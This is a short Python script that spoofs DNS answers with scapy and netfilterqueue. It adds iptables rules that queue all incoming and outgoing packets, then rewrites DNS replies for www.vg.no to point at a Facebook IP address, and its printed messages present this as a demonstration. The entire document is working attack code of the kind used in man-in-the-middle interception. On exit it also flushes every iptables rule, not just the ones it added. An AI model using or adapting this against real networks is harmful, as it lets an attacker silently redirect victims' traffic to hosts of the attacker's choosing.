import netfilterqueue
import scapy.all as scapy
import subprocess
import os

target = "www.facebook.com"
targetIP = "157.240.8.35"
pingAddress = "www.vg.no"

def callback(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qnames = scapy_packet[scapy.DNSQR].qname
        if qnames==pingAddress+'.':
            dnsrr = scapy_packet[scapy.DNS].an
            scapy_packet[scapy.DNS].ancount=1
            scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=target, rdata=targetIP)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()

def iptables():
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])

def flushIptables():
    subprocess.call(["iptables", "--flush"])
    
iptables()

print("Starting DNS-spoof")
print("")
print("Please open a new terminal and try to ping www.vg.no")
print("Notice the reply comes from facebook (157.240.8.35)")
print("")

q=netfilterqueue.NetfilterQueue()
q.bind(1, callback) 
try:
    q.run()
except KeyboardInterrupt:
    flushIptables()
    print(" Closing program")
    pass

